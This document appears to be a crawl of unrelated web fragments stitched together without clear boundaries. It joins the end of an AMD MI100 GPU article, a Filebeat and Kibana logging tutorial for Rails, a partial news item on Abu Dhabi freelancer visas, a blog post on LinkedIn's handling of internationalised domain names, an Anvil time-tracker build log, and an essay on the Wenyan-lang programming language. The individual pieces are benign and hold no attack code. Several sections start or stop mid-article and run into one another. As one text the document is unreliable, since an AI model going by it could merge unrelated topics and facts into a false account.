<figure id="attachment_48505" aria-describedby="caption-attachment-48505"><a href="https://www.servethehome.com/amd-radeon-instinct-mi100-32gb-cdna-gpu-launched/amd-radeon-instinct-mi100-with-epyc-cpus/" rel="attachment wp-att-48505"><img loading="lazy" src="https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-with-EPYC-CPUs.jpg" alt="AMD Radeon Instinct MI100 With EPYC CPUs" width="1222" height="719" srcset="https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-with-EPYC-CPUs.jpg 1222w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-with-EPYC-CPUs-400x235.jpg 400w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-with-EPYC-CPUs-800x471.jpg 800w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-with-EPYC-CPUs-696x410.jpg 696w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-with-EPYC-CPUs-1068x628.jpg 1068w, https://www.servethehome.com/wp-content/uploads/2020/11/AMD-Radeon-Instinct-MI100-with-EPYC-CPUs-714x420.jpg 714w" sizes="(max-width: 1222px) 100vw, 1222px"></a><figcaption id="caption-attachment-48505">AMD Instinct MI100 With EPYC CPUs</figcaption></figure>
<p>If you look at the cover image as well as the above, you can see that the bottom of the cards have PCIe Gen4 connectors but the top of the cards have a special bridge allowing GPU-to-CPU communication. NVIDIA has NVLink and the custom SXM4 form factor <a href="https://www.servethehome.com/nvidia-tesla-a100-4x-gpu-hgx-redstone-platform/">NVIDIA A100 4x GPU HGX Redstone platform</a>.</p>

<p>Supporting these designs are systems from HPE, Dell, Supermicro, and Gigabyte. The Dell EMC PowerEdge R7525 you may have seen in our <a href="https://www.servethehome.com/dell-and-amd-showcase-future-of-servers-160-pcie-lane-design/">Dell and AMD Showcase Future of Servers 160 PCIe Lane Design</a> article. We expect these platforms to support the AMD EPYC 7003 “Milan” generation as well.</p>
<h2>Final Words</h2>
<p>AMD is a few quarters behind NVIDIA launching the MI100 but well ahead of Intel’s Xe HPC part. With the big headliners of two major exascale supercomputers moving to AMD, we can imagine other smaller installations will look at what AMD is offering more seriously. It is good to see that AMD has a plan to close the software and capability gap with NVIDIA.</p>

<p>Installation of filebeat is dead simple. You can follow simple steps described in&nbsp;<a href="https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-installation.html">official documentation</a>.</p>



<p><strong>Sample filebeat.yml</strong>&nbsp;–&nbsp;<code>/usr/local/etc/filebeat/filebeat.yml</code></p>



<pre>#---------- Filebeat inputs ----------
filebeat.inputs:
- type: log
  enabled: true
  json:
    message_key: message
    keys_under_root: true
    overwrite_keys: true
  paths:
    - /Users/pramod/projects/efk-rails/log/sync_development.log
#ElasticSearch template setting 
setup.ilm.enabled: false
setup.template.enabled: false
setup.template.name: "efk-rails-sync-dev"
setup.template.pattern: "efk-rails-sync-dev-*"
#---------- Kibana ----------
setup.kibana:
  host: "0.0.0.0:5601"
#---------- Elasticsearch output ----------
output.elasticsearch:
  # Array of hosts to connect to.
  hosts: ["0.0.0.0:9200"]
  index: "sync-log-dev"</pre>



<p>In above configuration file we have configured following options&nbsp;</p>



<ul><li>inputs – Used for specifying input for filebeat, here we have configured input as rails log file&nbsp;<em><code>/Users/pramod/projects/efk-rails/log/sync_development.log</code></em>&nbsp;with JSON option which will decode logs structured as JSON messages&nbsp;</li><li>output – Used to set the output for filebeat, here we will write to elasticsearch indexes.&nbsp;</li><li>setup.kibana – the Kibana endpoint which will load the kibana dashboard</li></ul>



<h2>Custom Index Template with rollover</h2>



<p>We off course can use the default&nbsp;<a href="https://www.elastic.co/guide/en/beats/filebeat/current/configuration-template.html" target="_blank" rel="noreferrer noopener">template</a>&nbsp;and&nbsp;<a href="https://www.elastic.co/guide/en/beats/filebeat/current/ilm.html" target="_blank" rel="noreferrer noopener">rollover</a>&nbsp;options but you cannot use the custom index template names, this is specially needed if you want the setup environment&nbsp;wise kibana dashboards on a single kibana and elasticsearch instances and this is what we needed in most of the Rails applications.&nbsp;</p>



<p>Here we will use the custom template and index lifecycle management (ilm) for rotating our logs indexes as per different rails environments.&nbsp;</p>



<p>To enable a custom index template name and&nbsp;<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.8/set-up-lifecycle-policy.html" target="_blank" rel="noreferrer noopener">rollover policy</a>&nbsp;you need to follow the following steps</p>



<ol><li>Setup a ilm enabled to false, add custom template name and pattern with following options</li></ol>



<pre>setup.ilm.enabled: false
setup.template.enabled: false
setup.template.name: "efk-rails-sync-dev"
setup.template.pattern: "efk-rails-sync-dev-*"</pre>



<p>Above config will tell filebeat to use&nbsp;<code>efk-rails-sync-dev</code>&nbsp;and&nbsp;<code>efk-rails-sync-dev-*</code>&nbsp;name and index pattern respectively, It’s a common practice to specify the index pattern rather than using index name.&nbsp;</p>



<p>2. Create a life cycle policy using&nbsp;<a href="https://www.elastic.co/guide/en/kibana/current/console-kibana.html">Kibana dev tool</a></p>



<pre>PUT _ilm/policy/sync-log
{
  "policy": {
    "phases": {
      "hot": {
        "min_age": "0ms",
        "actions": {
          "rollover": {
            "max_age": "3d",
            "max_size": "100mb"
          }
        }
      },
      "delete": {
        "min_age": "2d",
        "actions": {
          "delete": {}
        }
      }
    }
  }
}</pre>



<p>Above will create a index lifecycle policy which will rollover indexes if its size reaches to 100mb or index age is 3 days whichever turns first true.</p>



<p>3. Create template pattern using&nbsp;<a href="https://www.elastic.co/guide/en/kibana/current/console-kibana.html">Kibana dev tool</a></p>



<pre>PUT _template/efk-rails-sync-dev
{
  "index_patterns": ["efk-rails-sync-dev-*"], 
  "settings": {
    "number_of_shards": 1,
    "index.lifecycle.name": "sync-log", 
    "index.lifecycle.rollover_alias": "sync-log-dev" 
  }
}</pre>



<p>This will create a template&nbsp;<code>efk-rails-sync-dev</code>&nbsp;with index alias&nbsp;<code>sync-log-dev</code>&nbsp;and attach lifecycle policy&nbsp;<code>sync-log</code>that created in step 2.&nbsp;</p>



<p>4. In last step we will create the first index managed by a policy that uses the rollover action and designate it as the write index</p>



<pre>PUT efk-rails-sync-dev-000001 
{
  "aliases": {
    "sync-log-dev":{
      "is_write_index": true
    }
  }
}</pre>



<p>This will create initial index&nbsp;<code>efk-rails-sync-dev-000001</code>&nbsp;which will be used by filebeat to write output of application.&nbsp;</p>



<h2>Application logs in JSON format&nbsp;</h2>



<p>Once you create index life cycle policy, template and first rollover index which will capture logs from filebeat harvester. You need make your application logs to output in JSON format.&nbsp;</p>



<div><p>To output rails logs into JSON format, we are using&nbsp;<a rel="noreferrer noopener" href="https://github.com/roidrage/lograge" target="_blank">lograge</a>&nbsp;gem once you add it in Gemfile and bundle install it will be available to use in you application.&nbsp;</p><p>For demo purpose, We will be logging only single controller actions into JSON and search via Kibana.&nbsp;</p><p>Following lograge configuration will output logs in JSON for SyncContoller#index and SyncController#Create action&nbsp;</p></div>



<p>$config/initializers/lograge.rb</p>



<pre>Rails.application.configure do
  config.lograge.enabled = true
  config.lograge.keep_original_rails_log = true
  config.lograge.base_controller_class = 'ActionController::API'
  config.lograge.logger = ActiveSupport::Logger.new "#{Rails.root}/log/sync_#{Rails.env}.log"
  config.lograge.formatter = Lograge::Formatters::Json.new
  config.lograge.ignore_custom = lambda do |event|
    # return true here if you want to ignore based on the event
    return false if event.payload[:controller].include?("SyncController") &amp;&amp;
     ['index', 'create'].include?(event.payload[:action])
    return true
  end
  config.lograge.custom_payload do |controller|
    if controller.class.name.include?('SyncController')
      SyncLogger.new(controller).log_data
    end
  end
end</pre>



<p>SyncLogger service to add some meta data to logger file</p>



<p>$app/services/sync_logger.rb</p>



<pre>class SyncLogger
  def initialize(controller)
    @controller = controller
  end
  def log_data
    request_type = @controller.request.method
    username = @controller.current_user.try(:username) || 'guest'
    r_data = request_type == 'GET' ? JSON.parse(@controller.response.body) : @controller.request.parameters
    log_data = {
      u_agent: @controller.request.user_agent,
      request_time: Time.now.to_s(:number),
      search_key: "#{request_type}_#{username}_#{Time.zone.now.to_s(:number)}",
      ip: @controller.request.ip,
      user_id: @controller.current_user.try(:id),
      username: username,
      data: r_data
    }
  end
end</pre>



<p>Above service will create JSON output for SyncContoller#index and SyncController#Create action in following format&nbsp;</p>



<p>$log/sync_development.log</p>



<pre>{"method":"GET","path":"/sync","format":"*/*","controller":"SyncController","action":"index","status":200,"duration":16.64,"view":1.18,"db":0.2,"u_agent":"PostmanRuntime/7.26.1","request_time":"20200818210529","search_key":"GET_pramod_20200818153529","ip":"127.0.0.1","user_id":1,"username":"pramod","data":[{"username":"pramod"},{"username":"pramdo1"}]}
{"method":"GET","path":"/sync","format":"*/*","controller":"SyncController","action":"index","status":200,"duration":15.82,"view":0.48,"db":0.93,"u_agent":"PostmanRuntime/7.26.1","request_time":"20200818210647","search_key":"GET_pramod_20200818153647","ip":"127.0.0.1","user_id":1,"username":"pramod","data":[{"username":"pramod"},{"username":"pramdo1"}]}</pre>



<p><a rel="noreferrer noopener" href="https://www.elastic.co/guide/en/beats/filebeat/current/filebeat-starting.html" target="_blank">Starting filebeat</a>&nbsp;to ship above logs to elasticsearch by executing following command from the root of the filebeat if you have downloaded the tar and extracted it or if you have installed filebeat as a service you can start filebeat as a service</p>



<pre>./filebeat -e
or 
sudo service filebeat start</pre>



<p>You should see following filebeat logs on successful</p>

<h2>Kibana in Action</h2>



<p>If above all is set correctly, We can search logs via Kibana by creating index pattern. You should see `efk-rails-sync-dev-000001` index in kibana index management, Using same index you can create index pattern for search.&nbsp;</p>

Classified by many countries as a “small business,” there are often strict rules for long stays. Abu Dhabi is trying to fix that. While Dubai has a visa for remote employees, Abu Dhabi just launched a visa for freelancers in 48 categories, according to the Abu Dhabi Department of Economic Development (ADDED).&nbsp;</p><p>The remote freelancer visa used to only be available to residents. Non-residents required an employer to sponsor their visa to move to the Emirate. While remote worker visas for employees launched in Dubai, Abu Dhabi remained separate and kept its own rules.&nbsp;Previously, only residents and citizens of the UAE could apply for the special freelancer visa. That’s now been expanded to include non-residents.</p><figure><div><div><blockquote data-lang="en"><p lang="en" dir="ltr">ADDED permits licensing for Freelancer activities for citizens and non-citizens within 48 economic activities.

According to the ADDED official Twitter page, freelancers must prove the following in order to qualify: Proof of expertise such as a university degree, certificate, or accredited accomplishments and details of your contracts such as working hours, holidays, and general requirements. If your clients are public sector (e.g. government), you will need special approval from the UAE government to work locally as a freelancer.</p><figure><div><div><blockquote data-lang="en"><div lang="und" dir="rtl"><p>يتوجب على المتقدمين بطلب الحصول على رخصة المهن الحرة من غير المواطنين استيفاء شروط اللائحة التنظيمية التي حددتها الدائرة.</p><p>Non-citizens applying to obtain a Freelancer license must fulfil the requirements of the regulatory regulations set by the department. <a href="https://t.co/tZ8M8vkSin">pic.twitter.com/tZ8M8vkSin</a></p></div>— دائرة التنمية الاقتصادية – أبوظبي (@AbuDhabiDED) <a href="https://twitter.com/AbuDhabiDED/status/1327998588702568448?ref_src=twsrc%5Etfw">November 15, 2020</a></blockquote></div></div></figure><h2>The wave of remote work tourism</h2><p>There’s a lot of discussion about whether <a href="https://remotelyinclined.substack.com/p/is-remote-work-residency-the-new" target="_blank" rel="noreferrer noopener">remote work residency is the new vacation</a>.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



		<div>



			
<p>In Denmark it is possible to register domains with funny characters such as æ, ø and å. And we do. One prominent example is our national portal for booking Covid-19 tests at <a href="https://xn--coronaprver-ngb.dk/">https://coronaprøver.dk</a>. <a href="https://en.wikipedia.org/wiki/Internationalized_domain_name">Wikipedia calls these beasts Internationalised domain names</a>, so they must indeed exist.</p>



<p>Recently I quit my job (have a new one now, luckily) and found myself making posts on a <a href="https://www.linkedin.com/">social network known as LinkedIn</a> to improve my prospects.</p>



<p>One of these posts was about about a hobby project I made called <a href="https://wishlist.dk/" data-type="URL" data-id="https://wishlist.dk">wishlist.dk</a>, an ad free wish registry. The big player on the Danish wish registry market (what a market: it seems every novice web developer in Denmark has launched one of these) is <a href="https://xn--nskeskyen-k8a.dk/">https://<strong>ø</strong>nskeskyen.dk</a>.</p>



<p>What I wanted to let my network know was something like:</p>



<blockquote><p>“I have launched wishlist.dk – a gratis, ad and surveilance free alternative to evil wish list giant ønskeskyen.dk”</p><cite>– Morten Helmstedt, job seeker</cite></blockquote>



<p>Alas, LinkedIn’s URL parser breaks in many ways when trying to express your career news and feelings through internationalised domain names.</p>



<h3>How do thee fail? Let me count the ways.</h3>



<p>When making a post on LinkedIn with an URL, LinkedIn will try to:</p>



<ul><li>Create a preview of the first URL in the post</li><li>Create a short link for all URLs in the post containing a path (e.g. https://lindkedin.com/<em>path</em>), not for top level domains and subdomains without a path. It will generally look like and point to something like <em>https://lnkd.in/eCTD8Q9</em></li></ul>



<p>Here are the bugs I noticed in action:</p>



<h4>Posting like a sane person</h4>



<figure><img loading="lazy" width="545" height="352" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin1.png" alt="" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin1.png 545w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin1-300x194.png 300w" sizes="(max-width: 545px) 100vw, 545px"><figcaption>Trying to post an internationalised domain name like any sane person would. Post preview fails to load. The link in the post itself works as expected, though.</figcaption></figure>



<h4>Posting like a LinkedIn person</h4>



<figure><img loading="lazy" width="550" height="648" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin2.png" alt="" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin2.png 550w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin2-255x300.png 255w" sizes="(max-width: 550px) 100vw, 550px"><figcaption>Whois’ing the “real” domain name and posting it like no true Dane would. Post preview succeeds.</figcaption></figure>



<p>Things go from bad to worse when trying to post an internationalised domain name with a path such as <a href="https://xn--nskeskyen-k8a.dk/text/cookies">https://ønskeskyen.dk/text/cookies</a>.</p>



<p>If I just post that URL, I get a post like this:</p>



<figure><img loading="lazy" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin3.png" alt="" width="540" height="142" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin3.png 540w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin3-300x79.png 300w" sizes="(max-width: 540px) 100vw, 540px"><figcaption>LinkedIn shortens the link to make it more readable and to be able to track our smallest actions on the world wide web.</figcaption></figure>



<p>What happens when I click the link is this:</p>



<h4>INVALID REDIRECT</h4>



<figure><img loading="lazy" width="773" height="319" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin4.png" alt="" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin4.png 773w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin4-300x124.png 300w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin4-768x317.png 768w" sizes="(max-width: 773px) 100vw, 773px"><figcaption>An error! (Invalid redirect)</figcaption></figure>



<p>My browser (Firefox) tries to GET the URL and is redirected to <em>linkedin.com/slink</em>:</p>



<figure><img loading="lazy" width="374" height="235" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin5.png" alt="" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin5.png 374w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin5-300x189.png 300w" sizes="(max-width: 374px) 100vw, 374px"><figcaption>A 301 redirect in action!</figcaption></figure>



<p>And then:</p>



<figure><img loading="lazy" width="357" height="381" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin6.png" alt="" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin6.png 357w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin6-281x300.png 281w" sizes="(max-width: 357px) 100vw, 357px"><figcaption>The submitted URL is stored, but the location should probably be <a rel="noreferrer noopener" target="_blank" href="https://xn--nskeskyen-k8a.dk/text/cookies">https://%C3%B8nskeskyen.dk/text/cookies</a> or maybe even <a href="https://xn--nskeskyen-k8a.dk/text/cookies">https://xn--nskeskyen-k8a.dk/text/cookies</a>. Who knows? It’s complicated. LinkedIn engineers should definitely look into this!</figcaption></figure>



<h2>How I tried to fix this mess</h2>



<p>Well, I contacted LinkedIn on Twitter (WHAT!), tried e-mailing their security e-mail (no reply, of course, but only e-mail I could find) and got in touch with a very understanding Member Support Consultant named Vegard who tried his/her best:</p>



<figure><img loading="lazy" width="797" height="508" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin8.png" alt="" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin8.png 797w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin8-300x191.png 300w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin8-768x490.png 768w" sizes="(max-width: 797px) 100vw, 797px"><figcaption>Pretty impressive response after describing the problem.</figcaption></figure>



<h4>If our URL parser doesn’t work, just change your URL</h4>



<p>But then the engineering team told me that I should just stop posting internationalised domain names to LinkedIn:</p>



<figure><img loading="lazy" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin9.png" alt="" width="610" height="471" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin9.png 808w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin9-300x232.png 300w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin9-768x593.png 768w" sizes="(max-width: 610px) 100vw, 610px"><figcaption>True for Chrome, not for Firefox, not from a usability perspective</figcaption></figure>



<p>I tried to have Vegard tell the engineers at LinkedIn to read up on internationalised domain names, but no such luck: </p>



<figure><img loading="lazy" width="793" height="571" src="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin10.png" alt="" srcset="https://helmstedt.dk/wp-content/uploads/2020/11/linkedin10.png 793w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin10-300x216.png 300w, https://helmstedt.dk/wp-content/uploads/2020/11/linkedin10-768x553.png 768w" sizes="(max-width: 793px) 100vw, 793px"><figcaption>The sorry end.</figcaption></figure>



<h2>THE END</h2>



<h2>An aside:</h2>



<p>As another hobby project, I created <a href="https://lnk.dk/">lnk.dk</a>, a very simple short link generator (like wish registries, it seems every aspiring web developer in Denmark has made one of these). Using <a href="https://www.djangoproject.com/">Django</a>‘s built in <code>URLField</code> I can validate, store and correctly redirect internationalised domain names with hardly any work at all on my part.</p>



<p><em>If only tools like that were available for the engineers at LinkedIn to use for their URL parsing and shortening…</em></p>

<p>Typically we tend to overestimate what’s possible in a short time, and underestimate what’s possible over a longer time frame. But in showing people <a href="https://anvil.works/">Anvil</a> we’ve found an odd exception – they tend to <em>underestimate</em> what they can build in as little as a day!</p>

<p>So I decided to put it to the test. I asked, <strong>What can I build in one working day with Anvil?</strong></p>

<p>Since I’m tracking my own time for this challenge, it seemed natural to build a time tracking app - something like <a href="https://clockify.me/">Clockify</a>. Clockify has a ton of features, so I decided to pick some essentials and aimed for a Minimum Viable Product (MVP). This is my project report, detailing the progress and timings.</p>

<p>Everything I built here, I wrote between lunchtime one day and lunchtime the next – so, I did this all in one working day!</p>

<h2 id="spoiler">Spoiler:</h2>

<p>Here’s how it looked in the end:</p>

<p>To build an MVP, you you need to work out how much functionality you really need to be viable. I decided my MVP would need:</p>

<ul>
<li>Multi-user support allowing for new user sign-ups</li>
<li>One or Zero live Time Trackers per user at any one time</li>
<li>Each Time Tracker should:

<ul>
<li>be linked to a Project</li>
<li>have notes and tags</li>
<li>be easily editable and deletable</li>
</ul></li>
<li>Each Project should have:

<ul>
<li>a color</li>
<li>a client</li>
<li>an hourly rate</li>
</ul></li>
<li>Graphical Reports by project and day</li>
</ul>

<hr>

<h2 id="1-app-structure-1-hour">1. App Structure (1 hour)</h2>

<p>With a project this big, it took me an hour to get a skeleton of the app in place. That included the database, login and signup, and placeholders for all the screens in the app.</p>

<p>The first 15 minutes were dedicated to setting up and organising the <a href="https://anvil.works/docs/data-tables">Data Tables</a>, and creating the <a href="https://anvil.works/docs/client/ui#forms">Forms</a> which make up the UI:</p>


<div>

                <p>Data Table Structure</p>

</div>

                <p>Form structure</p>
            </figcaption>
    </figure>
</div>

<p>The next 15 minutes were spent adding multi-user support with Anvil’s <a href="https://anvil.works/docs/users">Users Service</a>, and redirecting the user to either a Login Form or Main App depending on whether the user had a remembered login or not.</p>

<p>Next, I spent 15 minutes creating and wiring up the Login / Signup UI:</p>


<div>
    <figure><img src="https://anvil.works/learn/examples/img/clockify/sign_up_form.png" alt="Sign-up Form"> <figcaption>
                <p>Sign-up Form</p>
            </figcaption>
    </figure>
</div>

<p>Finally, I implemented the Main App navigation. I linked the side nav and top nav bar to relevant pages within the app, changing the role of the active side nav link to <code>'selected'</code> when clicked.</p>


<div>
    <figure><img src="https://anvil-website-static.s3.eu-west-2.amazonaws.com/learn/examples/clockify/navigation.gif" alt="Navigation"> <figcaption>
                <p>Navigation</p>

    </figure>
</div>

<hr>

<h2 id="2-global-data-and-user-settings-40-mins">2. Global Data and User Settings (40 mins)</h2>

<p>From the <a href="#scoping-my-mvp">requirements</a>, some basic user data would need to be created after a new sign up.</p>

<p>Once logged in, I made single <a href="https://anvil.works/docs/server#calling-server-functions-from-client-code">server call</a> to get relevant user data from the Data Table to the client, then stored it as variables in a <a href="https://anvil.works/docs/client/python/modules">Data Module</a>. To speed up development, it seemed sensible to send <a href="https://anvil.works/docs/data-tables/data-security#views">client writable views</a> of data associated with the logged-in user.</p>

<div title="Server-side Python" tabindex="0"><div><pre><code data-lang="python"><span># Get the current logged-in user</span>
<span>user</span> <span>=</span> <span>anvil</span><span>.</span><span>users</span><span>.</span><span>get_user</span><span>()</span>
<span># Client writable view of the timetracker table containing rows belonging to the current user</span>
<span>time_trackers</span> <span>=</span> <span>app_tables</span><span>.</span><span>timetracker</span><span>.</span><span>client_writable</span><span>(</span><span>user</span><span>=</span><span>user</span><span>)</span>
<span>return</span> <span>time_trackers</span></code></pre></div></div>


<p>Next, I implemented a settings page to edit the default hourly rate and preferred currency. I used an <a href="https://anvil.works/docs/client/python/alerts-and-notifications">modal dialog</a> for data entry, and included some data validation to ensure the hourly rate was non-negative.</p>


<div>
    <figure><img src="https://anvil.works/learn/examples/img/clockify/hourly_rate.png" alt="Settings Page"> <figcaption>
                <p>Settings Page</p>
            </figcaption>
    </figure>
</div>

<hr>

<h2 id="3-projects-page-40-mins">3. Projects Page (40 mins)</h2>

<p>The Projects Page was its own CRUD app. The user can create a new Project with a <code>title</code>, <code>color</code>, <code>client</code> and <code>hourly_rate</code>. All projects are listed in a <a href="https://anvil.works/docs/client/components/data-grids">Data Grid</a>. The alert/modal used to create a new project was reused to update a current project.</p>

<p>Selecting a color was a nice UI feature. I wrote the UI for this in code rather than Anvil’s Drag and Drop interface, creating a 9x9 grid of selectable colours.</p>


<div>
    <figure><img src="https://anvil.works/learn/examples/img/clockify/projects_page.png" alt="Projects Page"> <figcaption>
                <p>Projects Page</p>
            </figcaption>
    </figure>
</div>

<p>I used a <a href="https://anvil.works/docs/data-tables/data-security#views">client writable view</a> of the ‘Projects’ Data Table, so that there was no need to worry about sending data back to the server – I could securely update my data from client code. (If you’re interested in how this works, Meredydd gave a <a href="https://anvil.works/blog/pycon18-making-the-web-more-pythonic">short talk about it</a> at PyCon 2018.)</p>

<hr>



<p>The Clients and Tags pages were two more mini CRUD apps. These were far simpler than the projects page. The interfaces were identical. I considered refactoring them into a single Form but figured, at this stage, it was best to keep them separate. The modularity of Anvil Forms meant I could reuse the Clients/Tags Forms in the Settings page.</p>


<div>
    <figure><img src="https://anvil-website-static.s3.eu-west-2.amazonaws.com/learn/examples/clockify/tags.gif" alt="Tags"> <figcaption>
                <p>Tags</p>

    </figure>
</div>

<hr>

<h2 id="5-a-false-start-1-hour-30-minutes">5. A False Start (1 hour 30 minutes)</h2>

<p>Next, I started on the <strong>Time Tracking Page</strong> – but by this point it was the end of the afternoon, and I was getting tired. I could tell my working memory was getting overloaded with manipulating the data views.</p>

<p>It wasn’t <em>completely</em> wasted, but I did end up going down some blind alleys. Lesson learned: I should should have taken a break sooner!</p>

<hr>

<h2 id="6-next-morning-finish-time-tracking-page-1-hour-15-mins">6. Next Morning - Finish Time Tracking Page (1 hour 15 mins)</h2>

<p>Having slept on it, I came back fresh the next morning, and the issues I’d experienced at the end of the previous day seemed obvious now! I finished the time tracking page in just over an hour:</p>


<div>
    <figure><img src="https://anvil-website-static.s3.eu-west-2.amazonaws.com/learn/examples/clockify/time_trackers.gif" alt="Final Time Tracking Page"> <figcaption>
                <p>Final Time Tracking Page</p>

    </figure>
</div>

<hr>

<h2 id="7-reports-page-1-hour-30-mins">7. Reports Page (1 hour 30 mins)</h2>

<p>Now that I had time tracking data, it needed to be organised by date and project. It took 40 minutes to get the data into a format that could be plotted.</p>

<p>The next 50 mins were spent creating the <a href="https://anvil.works/docs/client/components/plots">Plots</a>. Most of that time was spent reading Plotly documentation to format the plots the way I wanted, using the right colors, adjusting the headings, changing the hover text, etc. The results looked pretty nice:</p>


<div>
    <figure><img src="https://anvil.works/learn/examples/img/clockify/reports.png" alt="Reports page"> <figcaption>
                <p>Reports page</p>

</div>

<hr>

<h2 id="8-testing-and-cherry-on-the-top-40-mins">8. Testing and Cherry on the Top (40 mins)</h2>

<p>I spent the last hour testing the UI and fixing a few obvious bugs – that took around 30 minutes. Just before lunch, I added a cherry on top: I used Javascript to the tab title display the time from the active Time Tracker, if one existed:</p>


<div>
    <figure><img src="https://anvil-website-static.s3.eu-west-2.amazonaws.com/learn/examples/clockify/tab_timer.gif" alt="Tab Timer"> <figcaption>
                <p>Tab Timer</p>
            </figcaption>
    </figure>
</div>

<hr>

<h2 id="9-responsiveness-no-time">9. Responsiveness - No Time</h2>

<p>Anvil takes care of much of the responsiveness. And so I got a mobile-friendly UI for free!</p>


<div>

    </figure>
</div>

<hr>

<h2 id="total-build-time-7-hrs-45-minutes">Total Build Time - 7 hrs 45 minutes</h2>

<p>In one day, I built a multi-user time tracker with data, reports, projects – and it’s not bad looking, either! Each time tracker is linked to projects, tags and clients, and there are screens to configure all of them. I also created a reports page and implemented a neat javascript function to display the value of the current time tracker in the tab title.</p>

<p>Here it is! A fully-featured time tracking system, built entirely in Anvil:</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p><img src="https://esoteric.codes/uploads/b315846a-e37e-49db-ac36-3625b7ed3cf6-wenyan-ide.png" alt="" width="" height="">The Wenyan-lang <em>Hello World</em> program reads like this:</p>
<pre>吾有一言。曰「「問天地好在。」」。書之。</pre>
<p>Even those of us who don't understand the characters can likely recognize it as a form of Natural Language Programming—a programming language whose code mimics prose—in its wordiness and its structure as sentences. In fact, Wenyan is built on its namesake, Classical Chinese (or Wényán), the written form of Chinese used from the 5th century BCE to the early 20th century. Because Wenyan-lang's inventive feature occurs in the nuance and humor of its <a href="https://esoteric.codes/blog/chef-multicoding-esolang-aesthetics" target="_blank" rel="noopener">multicoding</a> between Classical Chinese and code, as a non-reader, I am exploring this language through the insights of others. Yidi Tsao, a Berlin-based artist, curator and writer, explains that the text the Hello World actually prints (you can see it between the quotes 「「 and 」」) translates not to "Hello, World!" but closer to "Greetings to Heaven and Earth."</p>
<p>The humor and poetry in its engagement with Wényán become more clear in longer examples. In the <a href="https://ide.wy-lang.org/?file=beer" target="_blank" rel="noopener"><em>99 Bottles program</em></a> below (translated and notated by Tsao), beer is replaced with the more era-appropriate wine:</p>
<blockquote>
<p>吾有一言。曰「「春日宴。」」。書之。<br>I have a word, called “spring feast”.</p>
<p>有數九。名之曰「酒數」。<br>There are nine numbers. I call it "wine number". (note: 九 nine and 酒 wine are homophones in Chinese.)</p>
<p>恆為是。若「酒數」等於零者乃止也。<br>It is always like that. It only stops when "wine number" is zero.</p>
<p>吾有三言。曰「「與君」」。曰「酒數」。<br> I have three words. one is "with you". The other is "wine number".</p>
<p>曰「「杯酒。可以窮歡宴。綠酒一杯歌一遍。」」。書之。<br> It says, "glasses of wine. All the fun of the feast. A glass of green wine then a song."</p>
<p>減「酒數」以一。昔之「酒數」者。今其是矣云云。<br>Minus one from "wine number". Previous "wine number", now is this.</p>
<p>吾有一言。曰「「綠酒千杯腸已爛。」」。書之。<br>I have a word. It says "thousands of glasses of wine. my stomach is done."</p>
<p>The phrases came from a poem called "to Wang Han Yang" by <a href="https://en.wikipedia.org/wiki/Li_Bai" target="_blank" rel="noopener">Li Bai</a>, who is famous for his drinking habit, also the greatest poet in Chinese history. :D</p>
</blockquote>
<p>Lingdong Huang, Wenyan-lang's designed, was an undergrad at Carnegie Mellon at the beginning of the project. He designed the language itself in four days to avoid studying during finals week. But it was important to Lingdong, who majored in art as well as computer science, to then create an IDE that's not just sophisticated but beautifully presents the code. It rivals mainstream languages to the point that the first Hacker News discussion had to explain to some that it was an art piece. Below is the <em>99 Bottles</em> program as it appears in Wenyan-lang's <a href="https://ide.wy-lang.org/?file=helloworld" target="_blank" rel="noopener">web-based development environment</a>. It not only displays the program transpiled to JavaScript (with context-coloring for both the JS and Wenyan versions) but also formatted in columns, in the style of an ancient Chinese manuscript:</p>
<p><img src="https://esoteric.codes/uploads/0fcda54e-e529-43da-8a53-f8be953e51ab-wenyan-99bottles.png" alt="" width="885" height="949"><br><em>99 Bottles </em>program in Wenyan-lang interpreter</p>
<p>Lingdong looked to Chinese art for inspiration on the visual presentation:</p>
<blockquote>
<p>I’ve taught myself traditional painting a few years ago, and have been reading Chinese classics since very young. I enjoy the minimalistic aesthetics of Song Dynasty the most. My favorite Chinese artist is probably <a href="https://en.wikipedia.org/wiki/Ni_Zan" target="_blank" rel="noopener">Ni Zan</a>, known for his extremely bleak yet serene landscape paintings in washed out ink.</p>
</blockquote>
